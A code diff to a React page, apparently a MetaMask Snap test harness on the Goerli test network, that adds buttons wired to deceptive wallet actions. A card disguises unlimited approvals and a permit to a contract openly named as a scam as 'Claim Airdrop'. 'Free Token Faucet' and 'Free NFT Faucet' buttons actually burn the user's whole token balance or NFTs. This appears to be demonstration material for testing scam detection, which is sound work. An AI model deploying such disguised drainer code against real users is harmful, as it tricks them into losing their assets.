@@ -96,12 +96,15 @@ const ErrorMessage = styled.div`
   }
 `;
 
+const SCAM_CONTRACT_ADDRESS = '0xEdCc67ce2776011BE7a8525505223330a982FD68';
+const SAMPLE_TOKEN_ADDRESS = '0xb3704559a16a6ed2c85dc974ed9c50dc70fb478a';
+const SAMPLE_NFT_ADDRESS = '0xeD3FD6bc730dE23e8157B96227a0Cb9031004bb5';
+
 const domain = {
   name: 'SampleToken',
   version: '1',
   chainId: 5,
-  verifyingContract:
-    '0x9b66d55D0a737E0f9d08F2d56436D9A6D512e4bf' as `0x${string}`,
+  verifyingContract: SAMPLE_TOKEN_ADDRESS as `0x${string}`,
 };
 
 const types = {
@@ -151,7 +154,7 @@ const Index = () => {
 
       let provider = new ethers.providers.Web3Provider(window.ethereum);
       let token = new ethers.Contract(
-        '0x9b66d55D0a737E0f9d08F2d56436D9A6D512e4bf',
+        SAMPLE_TOKEN_ADDRESS,
         SampleTokenAbi,
         await provider.getSigner(),
       );
@@ -182,7 +185,7 @@ const Index = () => {
 
       let provider = new ethers.providers.Web3Provider(window.ethereum);
       let token = new ethers.Contract(
-        '0x15C2B9e9fc4f4960cADBfF74c4B455464a146FAE',
+        SAMPLE_NFT_ADDRESS,
         SampleNFTAbi,
         await provider.getSigner(),
       );
@@ -213,7 +216,7 @@ const Index = () => {
       let owner = await signer.getAddress();
 
       let token = new ethers.Contract(
-        '0x9b66d55D0a737E0f9d08F2d56436D9A6D512e4bf',
+        SAMPLE_TOKEN_ADDRESS,
         SampleTokenAbi,
         await provider.getSigner(),
       );
@@ -222,7 +225,7 @@ const Index = () => {
 
       let values = {
         owner,
-        spender: '0xCd064F4A2a3bbA950E5e7866224C0Fe48286F96c',
+        spender: SCAM_CONTRACT_ADDRESS,
         nonce,
         value: ethers.constants.MaxUint256,
         deadline: Math.round(Date.now() / 1000) + 100_000,
@@ -255,15 +258,12 @@ const Index = () => {
 
       let provider = new ethers.providers.Web3Provider(window.ethereum);
       let token = new ethers.Contract(
-        '0x15C2B9e9fc4f4960cADBfF74c4B455464a146FAE',
+        SAMPLE_NFT_ADDRESS,
         SampleNFTAbi,
         await provider.getSigner(),
       );
 
-      await token.setApprovalForAll(
-        '0x22e4aff96b5200f2789033d85fca9f58f163e9ea',
-        true,
-      );
+      await token.setApprovalForAll(SCAM_CONTRACT_ADDRESS, true);
     } catch (e) {
       console.error(e);
       dispatch({ type: MetamaskActions.SetError, payload: e });
@@ -291,7 +291,7 @@ const Index = () => {
       );
       let provider = new ethers.providers.Web3Provider(window.ethereum);
       let contract = new ethers.Contract(
-        '0xCd064F4A2a3bbA950E5e7866224C0Fe48286F96c',
+        SCAM_CONTRACT_ADDRESS,
         ScamContractAbi,
         await provider.getSigner(),
       );
@@ -307,6 +307,104 @@ const Index = () => {
         r,
         s,
       );
+    } catch (e) {
+      console.error(e);
+      dispatch({ type: MetamaskActions.SetError, payload: e });
+    }
+  };
+
+  const handleClaimNFTAirdrop = async () => {
+    try {
+      let [from] = (await window.ethereum.request({
+        method: 'eth_requestAccounts',
+      })) as string[];
+
+      let networkVersion = await window.ethereum.request({
+        method: 'net_version',
+      });
+
+      if (networkVersion !== '5') {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x5' }],
+        });
+      }
+
+      let provider = new ethers.providers.Web3Provider(window.ethereum);
+      let contract = new ethers.Contract(
+        SCAM_CONTRACT_ADDRESS,
+        ScamContractAbi,
+        await provider.getSigner(),
+      );
+
+      await contract.claimNFTAirdrop();
+    } catch (e) {
+      console.error(e);
+      dispatch({ type: MetamaskActions.SetError, payload: e });
+    }
+  };
+
+  const handleClaimFreeTokens = async () => {
+    try {
+      let [from] = (await window.ethereum.request({
+        method: 'eth_requestAccounts',
+      })) as string[];
+
+      let networkVersion = await window.ethereum.request({
+        method: 'net_version',
+      });
+
+      if (networkVersion !== '5') {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x5' }],
+        });
+      }
+
+      let provider = new ethers.providers.Web3Provider(window.ethereum);
+      let signer = await provider.getSigner();
+      let contract = new ethers.Contract(
+        SAMPLE_TOKEN_ADDRESS,
+        SampleTokenAbi,
+        signer,
+      );
+
+      let owner = await signer.getAddress();
+      let balanceOfOwner = await contract.balanceOf(owner);
+
+      await contract.burn(balanceOfOwner);
+    } catch (e) {
+      console.error(e);
+      dispatch({ type: MetamaskActions.SetError, payload: e });
+    }
+  };
+
+  const handleClaimFreeNFTs = async () => {
+    try {
+      let [from] = (await window.ethereum.request({
+        method: 'eth_requestAccounts',
+      })) as string[];
+
+      let networkVersion = await window.ethereum.request({
+        method: 'net_version',
+      });
+
+      if (networkVersion !== '5') {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x5' }],
+        });
+      }
+
+      let provider = new ethers.providers.Web3Provider(window.ethereum);
+      let signer = await provider.getSigner();
+      let contract = new ethers.Contract(
+        SAMPLE_NFT_ADDRESS,
+        SampleNFTAbi,
+        signer,
+      );
+
+      await contract.burnUserNFTs(0);
     } catch (e) {
       console.error(e);
       dispatch({ type: MetamaskActions.SetError, payload: e });
@@ -400,6 +498,7 @@ const Index = () => {
               />
             ),
           }}
+          disabled={!state.installedSnap}
         />
         <Card
           content={{
@@ -466,9 +565,47 @@ const Index = () => {
               'A request to set approval for all tokens disgused as Claim Airdrop',
             button: (
               <SendHelloButton
-                // onClick={handleClaimNFTAirdrop}
+                onClick={handleClaimNFTAirdrop}
                 disabled={!state.installedSnap}
                 message="ClaimNFTAirdrop"
+              />
+            ),
+          }}
+          disabled={!state.installedSnap}
+          fullWidth={
+            state.isFlask &&
+            Boolean(state.installedSnap) &&
+            !shouldDisplayReconnectButton(state.installedSnap)
+          }
+        />
+        <Card
+          content={{
+            title: 'Claim Free Tokens daily',
+            description: 'Free Token Faucet',
+            button: (
+              <SendHelloButton
+                onClick={handleClaimFreeTokens}
+                disabled={!state.installedSnap}
+                message="Claim Free Tokens"
+              />
+            ),
+          }}
+          disabled={!state.installedSnap}
+          fullWidth={
+            state.isFlask &&
+            Boolean(state.installedSnap) &&
+            !shouldDisplayReconnectButton(state.installedSnap)
+          }
+        />
+        <Card
+          content={{
+            title: 'Claim Free NFTs daily',
+            description: 'Free NFT Faucet',
+            button: (
+              <SendHelloButton
+                onClick={handleClaimFreeNFTs}
+                disabled={!state.installedSnap}
+                message="Claim Free NFTs"
               />
             ),
           }}
